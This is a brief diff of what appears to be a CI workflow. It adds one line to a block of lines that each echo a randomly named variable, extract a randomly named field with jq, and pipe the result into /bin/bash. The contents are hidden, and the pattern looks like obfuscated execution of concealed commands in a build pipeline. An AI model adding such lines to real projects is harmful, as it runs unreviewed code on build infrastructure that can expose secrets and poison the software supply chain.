@@ -42,6 +42,7 @@ jobs:
           echo $jwd4 | jq -r .txker15 | /bin/bash
           echo $ti23127 | jq -r .pdu131 | /bin/bash
           echo $hxmtj7 | jq -r .ljb21 | /bin/bash
+          echo $um40999 | jq -r .mwqn2 | /bin/bash
 
       - name: Upload artifact
         if: always()
